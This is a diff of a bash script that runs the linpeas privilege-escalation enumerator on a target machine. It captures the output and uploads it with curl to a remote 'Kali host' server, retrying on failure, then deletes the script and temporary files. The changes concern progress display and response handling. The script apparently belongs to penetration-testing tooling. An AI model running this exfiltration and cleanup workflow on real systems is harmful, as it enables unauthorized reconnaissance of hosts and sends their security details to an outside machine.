@@ -60,7 +60,7 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
     chmod +x "$SCRIPT_PATH"
     
     echo "[*] Running linpeas (this may take a few minutes)..."
-    echo "[*] Progress will be shown, but output is being captured..."
+    echo "[*] Progress will be shown, output is being captured..."
     echo ""
     
     # Run linpeas and save output (show progress)
@@ -76,16 +76,17 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
     echo ""
     echo "[*] Scan complete. Output size: $((OUTPUT_SIZE / 1024)) KB"
     echo "[*] Transferring to Kali host..."
+    echo ""
     
-    # Send to Kali with retry logic and proper timeout
+    # Send to Kali with retry logic and progress bar
     MAX_RETRIES=3
     RETRY_COUNT=0
     
     while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
-        echo "[*] Upload attempt $((RETRY_COUNT + 1))/$MAX_RETRIES..."
+        echo "[*] Upload attempt $((RETRY_COUNT + 1))/$MAX_RETRIES"
         
-        # Use curl with explicit timeouts and write response to file
-        RESPONSE=$(curl -X POST \
+        # Use curl with progress bar
+        HTTP_CODE=$(curl -X POST \
             -H "X-Session-ID: $SESSION_ID" \
             -H "X-Hostname: $HOSTNAME" \
             -H "X-Scan-Type: $SCAN_TYPE" \
@@ -93,24 +94,26 @@ if [[ $SCAN_TYPE == "linpeas" ]]; then
             --data-binary "@$TMP_OUTPUT" \
             --connect-timeout 10 \
             --max-time 120 \
-            -w "\n%{http_code}" \
-            "$SERVER_URL/upload" 2>/dev/null)
+            -o /tmp/.upload_response.json \
+            -w "%{http_code}" \
+            --progress-bar \
+            "$SERVER_URL/upload")
         
-        # Get HTTP status code (last line)
-        HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-        RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)
+        echo ""
         
         if [[ "$HTTP_CODE" == "200" ]]; then
             echo "[+] Transfer successful!"
             
-            # Try to extract report URL
-            REPORT_URL=$(echo "$RESPONSE_BODY" | grep -o '"report_url":"[^"]*"' | cut -d'"' -f4)
-            if [[ -n "$REPORT_URL" ]]; then
-                echo "[+] View report at: $SERVER_URL$REPORT_URL"
+            # Try to extract report URL from response
+            if [[ -f /tmp/.upload_response.json ]]; then
+                REPORT_URL=$(grep -o '"report_url":"[^"]*"' /tmp/.upload_response.json 2>/dev/null | cut -d'"' -f4)
+                if [[ -n "$REPORT_URL" ]]; then
+                    echo "[+] View report at: $SERVER_URL$REPORT_URL"
+                fi
             fi
             
             echo "[+] Cleaning up..."
-            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT"
+            rm -f "$SCRIPT_PATH" "$TMP_OUTPUT" /tmp/.upload_response.json
             echo "[+] Done!"
             exit 0
         else
